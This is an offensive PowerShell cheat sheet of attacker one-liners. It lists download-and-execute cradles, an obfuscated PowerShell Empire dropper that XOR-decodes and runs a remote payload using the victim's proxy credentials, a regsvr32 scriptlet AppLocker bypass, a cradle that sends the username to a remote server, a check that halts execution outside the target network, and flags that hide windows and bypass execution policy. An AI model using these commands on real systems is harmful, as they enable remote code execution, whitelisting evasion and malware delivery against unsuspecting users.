Downloadstring:
IEX (New-Object Net.WebClient).DownloadString("http://...")

Downloadbin:
(New-Object System.Net.WebClient).DownloadFile('http://..','$env:temp'+'calc.exe');Start-Process '$env:temp'+'calcy.exe'

Powershell Empire dropper with xorkey
$Wc=NeW-ObjeCt SySTEM.Net.WebCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeadeRS.ADd('User-Agent',$u);$wc.PrOxy = [SyStem.NeT.WEbReQUeSt]::DEFauLTWeBProxy;$WC.PRoXY.CrEdENTIaLS = [SYStEM.NeT.CReDEnTiALCaChE]::DEFaulTNeTworKCREdeNtiaLS;$K='XORKEY';$i=0;[CHAr[]]$B=([CHaR[]]($wc.DOwnloaDSTRing("http://,,,,")))|%{$_-BXOr$k[$i++%$K.LENgTh]};IEX ($B-jOIn'')

Applocker bypass:
regsvr32 /u /s /i:http://&lt;IP_REDACTED&gt;/test.jpg scrobj.dll

Downloadstring with proxysettings with username notice:
$x=$Env:username;$u="http://..../txt?u=" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);IEX $s;

Check internalhost
Try {[System.Net.Dns]::GetHostByName('HOSTNAME')}Catch{break}
 
Flags
-noP		do not load profile scripts
-Exe ByPass     Try bypassing default powershell script execution policy
-win Hidden 	Prevent powershell spawning window
-nonl		Prevent interactive prompt for user	
-ENC 		Used to pass a base64 encoded string to PowerShell for execution.


